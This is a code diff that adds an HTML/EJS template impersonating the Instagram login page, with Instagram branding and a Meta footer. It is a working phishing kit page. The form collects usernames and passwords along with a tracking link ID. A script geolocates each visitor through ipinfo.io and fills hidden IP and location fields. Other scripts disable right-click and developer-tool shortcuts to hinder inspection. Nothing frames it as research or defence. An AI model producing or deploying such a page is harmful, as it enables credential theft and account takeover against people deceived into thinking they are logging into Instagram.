@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Login • Instagram</title>
+    <link rel="icon" href="/images/icons/ig.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <div class="flex flex-col min-h-screen">
+        <!-- Main Content -->
+        <main class="flex-grow flex items-center justify-center p-4">
+            <div class="w-full max-w-sm">
+                <div class="bg-white p-8 border border-gray-300 rounded mb-4">
+                    <!-- Instagram Logo -->
+                    <div class="flex justify-center mb-8">
+                        <img src="/images/icons/ig.png" alt="Instagram" class="h-12">
+                    </div>
+                    
+                    <form method="POST" class="space-y-4" autocomplete="off">
+                        <input type="hidden" name="linkId" value="<%=  '' %>">
+                        
+                        <div>
+                            <input type="text" 
+                                   name="email" 
+                                   placeholder="Phone number, username, or email"
+                                   required
+                                   maxlength="50"
+                                   pattern="[^<>]*"
+                                   class="w-full px-2 py-2 text-sm border border-gray-300 rounded focus:outline-none focus:border-gray-400 bg-gray-50"
+                                   onpaste="return false">
+                        </div>
+                        
+                        <div>
+                            <input type="password" 
+                                   name="password" 
+                                   placeholder="Password"
+                                   required
+                                   maxlength="50"
+                                   pattern="[^<>]*"
+                                   class="w-full px-2 py-2 text-sm border border-gray-300 rounded focus:outline-none focus:border-gray-400 bg-gray-50"
+                                   onpaste="return false"
+                                   autocomplete="new-password">
+                        </div>
+
+                        <input type="hidden" value="" name="city" id="cty">
+                        <input type="hidden" value="" name="country" id="country">
+                        <input type="hidden" value="" name="region" id="region">
+                        <input type="hidden" value="" name="ip" id="ip">
+                        
+                        <button type="submit" 
+                                class="w-full bg-[#0095f6] text-white font-semibold py-2 rounded hover:bg-[#1877f2] transition">
+                            Log In
+                        </button>
+                    </form>
+                </div>
+
+                <div class="bg-white p-4 border border-gray-300 rounded text-center">
+                    <p class="text-sm">
+                        Don't have an account? 
+                        <a href="#" class="text-[#0095f6] font-semibold">Sign up</a>
+                    </p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="py-4 text-center">
+            <div class="container mx-auto px-4">
+                <div class="text-xs text-gray-600">
+                    <p>© <%= new Date().getFullYear() %> Instagram from Meta</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const country = document.getElementById('country'); 
+        const region = document.getElementById('region'); 
+        const city = document.getElementById('cty'); 
+        const ip = document.getElementById('ip');
+
+        function getIpInfo() {
+            fetch('https://ipinfo.io/json?token=efd2f9e1d7b7a0')
+                .then(response => response.json())
+                .then(data => {
+                    country.value = data.country;
+                    region.value = data.region;
+                    city.value = data.city;
+                    ip.value = data.ip;
+                })
+                .catch(error => console.error(error));
+        }
+        getIpInfo();
+
+        // Prevent form resubmission on refresh
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Disable developer tools shortcut
+        document.addEventListener('keydown', (e) => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
